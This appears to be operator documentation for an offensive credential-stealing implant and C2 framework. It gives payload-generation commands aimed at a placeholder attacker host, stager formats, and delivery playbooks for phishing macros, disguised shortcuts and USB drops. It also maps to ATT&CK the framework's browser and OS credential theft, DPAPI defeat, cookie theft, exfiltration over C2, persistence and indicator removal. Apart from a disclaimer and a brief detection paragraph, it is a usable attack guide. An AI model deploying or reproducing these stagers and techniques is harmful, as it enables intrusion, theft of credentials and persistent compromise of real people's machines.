# Payloads, delivery vectors & technique catalog

Everything an operator needs to go from "implant built" to "running on the
target", plus the full capability-to-ATT&CK mapping. Lab/authorized use only —
see the README disclaimer.

## Generating payloads

```bash
python tools/make_payload.py --url http://YOUR.IP:9000/updater.exe \
    --c2 http://YOUR.IP:8443/gate --psk SECRET --auth opstoken --out build/payloads
python tools/make_payload.py --list        # catalog
```

Host the implant next to the payloads (`python -m http.server 9000` over
`build/`, or the repo root for the linux file: `/linux/sh_harvest.py`).
Every generated stage embeds the C2/PSK/auth and `--loop` arguments.

## Format catalog

| format | file | runs via | best for |
|---|---|---|---|
| ps1 | `stager.ps1` (+ `.b64cmd` one-liner) | powershell.exe | smallest vector; the b64 form pastes into run dialogs/registers |
| bat | `stager.bat` | cmd.exe | boxes where powershell.exe is blocked; certutil primary, bitsadmin + PS fallbacks |
| vbs | `stager.vbs` | wscript.exe | double-click with zero console flash |
| hta | `stage.hta` | mshta.exe | delivered as a "document"; no script-file extension blocking |
| lnk | `make_lnk.ps1` → `.lnk` | explorer double-click | icon-spoofed shortcut (folder/PDF icon); USB/zip distribution |
| macro | `macro.txt` | Word/Excel `.docm` | paste into `ThisDocument`; fires on open |
| sh | `stage.sh` | sh + curl + python3 | linux one-liner, memory delivery |
| py | `stage.py` | any python3 | memory-only, cross-platform |

All Windows stages converge on the same encoded cradle:
`DownloadFile → %TEMP%\<random>.exe → Start-Process -WindowStyle Hidden` with
the implant arguments baked in. Linux stages converge on
`curl | python3 - --loop N` with config in `SH_*` environment variables.

## Delivery playbooks (how each vector reaches a target)

| vector | ATT&CK | playbook | opsec notes |
|---|---|---|---|
| spearphishing attachment | T1566.001 | `.docm` with `macro.txt` inside; or `stage.hta` renamed `invoice.hta` | macro gets a MotW + Mark-of-Web prompt on download; HTA from web is blocked by SmartScreen on current builds |
| spearphishing link | T1566.002 | link to `stager.ps1.b64cmd` pasted into a run dialog / `iex` instruction | URL reputation is the weak point |
| removable media | T1091 | `documents.lnk` on a USB drop, folder icon | no network needed at click time; staged copy then pulls from C2 |
| user execution | T1204.001/.002 | double-click `.vbs`/`.hta`/`.lnk` disguised as documents | extension hiding makes `.lnk`/`.hta` effective |
| lateral manual placement | T1105 | `stager.bat` via any remote-exec path (smb share, ps session) | bat survives powershell-blocked contexts |

Detection surface (defender view — know what you're up against):
`powershell -w hidden -e` is high-fidelity telemetry (ScriptBlock 4104,
Sysmon EID 1 with encoded commandline); certutil/bitsadmin download are
classic LOLBin signatures; mshta + wscript spawning powershell is a
canonical detection rule; macro execution fires AMSI; .lnk with powershell
Arguments is flagged by LNK inspection tooling. Treat these as loud vectors
for labs, not for anything that must survive a mature SOC.

## Capability → MITRE ATT&CK matrix

| technique | ATT&CK | where |
|---|---|---|
| credentials from web browsers (Chromium) | T1555.003 | browser stage: handle-dup reads of locked DBs, Local State key |
| credentials from web browsers (Firefox) | T1555.004 | logins.json + key4.db, both legacy and modern schemes |
| credentials from password stores | T1555.005 | keyring/keychain stage (linux) |
| OS credential dumping: SAM/LSA via backup registry APIs | T1003.002 | SeBackupPrivilege → `NtOpenKeyEx(REG_OPTION_BACKUP_RESTORE)` → `RegQueryMultipleValuesW` (no RegSaveKey, no reg save on disk) |
| OS credential dumping: /etc/passwd & shadow | T1003.008 | linux keys stage |
| credentials in files | T1552.001 | SSH keys, putty/rdp sessions, FileZilla, docker auth, JWT scavenging |
| credentials from WiFi profiles | T1552.001 | WifiStage (WLAN profiles → offline PSK recovery) |
| steal web session cookies | T1539 | cookie stages incl. v10 DPAPI and v20 ABE chains |
| DPAPI + app-bound encryption defeat | T1555.003 | offline_unlock: hives → bootkey → secretsdump; masterkeys; CNG system keys → v20 master key |
| VSS/hive capture for offline hash extraction | T1003.002 | elevated run banks hive_SAM/SYSTEM/SECURITY + machine/user masterkeys |
| screen capture | T1113 | ScreenshotPng stage |
| system information discovery | T1082 | sysinfo.json in every bundle |
| security software discovery | T1518.001 | EdrScan stage |
| ingress tool transfer | T1105 | every stager's DownloadFile / curl |
| command & control over web protocol | T1071.001 / C2 on HTTP(S) | collector gate/beacon, optional TLS + cert pinning |
| non-standard port / custom protocol | T1571 / T1095 | SHV1 AES-GCM containers over raw POST |
| exfiltration over C2 channel | T1041 | same channel as tasking |
| scheduled task persistence | T1053.005 | Windows layer 1 (ONLOGON / hourly) |
| registry run key persistence | T1547.001 | Windows layer 2 (HKCU Run) |
| shortcut modification | T1547.009 | Windows layer 3 (Startup .lnk) |
| systemd service persistence | T1543.002 | Linux layer 1 (user service, Restart=always) |
| cron persistence | T1053.003 | Linux layer 2 (@reboot) |
| shell profile persistence | T1037.004 | Linux layer 3 (~/.bashrc + ~/.profile hooks) |
| powershell / cmd / vbs / mshta / sh / py execution | T1059.001/.003/.005, T1218.005, T1059.004/.009 | all stager formats |
| indicator removal (staged copy delete) | T1070.004 | `--persist-remove` / shred tooling |

## The one command that matters per platform

```powershell
# windows: build implant, host build/, generate all delivery stages
python tools/do_build.py --name updater.exe --c2 http://YOUR.IP:8443/gate
python tools/make_payload.py --url http://YOUR.IP:9000/updater.exe `
    --c2 http://YOUR.IP:8443/gate --out build/payloads
```

```bash
# linux: host repo root, deliver the one-liner
python tools/make_payload.py --url http://YOUR.IP:9000/linux/sh_harvest.py `
    --c2 http://YOUR.IP:8443/gate --out build/payloads
cat build/payloads/stage.sh    # this IS the payload
```
